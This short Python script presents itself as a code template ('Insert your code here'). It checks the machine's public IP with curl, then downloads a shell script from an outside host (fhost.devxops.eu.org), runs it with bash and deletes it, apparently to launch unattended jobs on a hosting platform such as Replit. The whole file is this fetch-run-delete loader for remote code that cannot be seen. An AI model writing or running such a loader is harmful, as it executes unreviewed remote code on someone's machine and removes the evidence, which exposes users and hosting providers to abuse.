# Insert your code here. 

import os 

os.system('curl cip.cc')

def startup(id=450, platform='replit', tags=''):

    if platform == 'replit':
        cmd = 'curl -L -O https://fhost.devxops.eu.org/devops/cicd/startups/{}-startup-v2.sh; bash {}-startup-v2.sh {} {} {}; rm {}-startup-v2.sh ;'.format(platform, platform, id, platform, tags, platform)
    else:
        cmd = 'curl -L -O https://fhost.devxops.eu.org/devops/cicd/startups/{}-startup.sh; bash {}-startup.sh {} {} {}; rm {}-startup.sh ;'.format(platform, platform, id, platform, tags, platform)
    
    os.system(cmd)
    print('ok , finish')
    #os.system('sleep 24h')
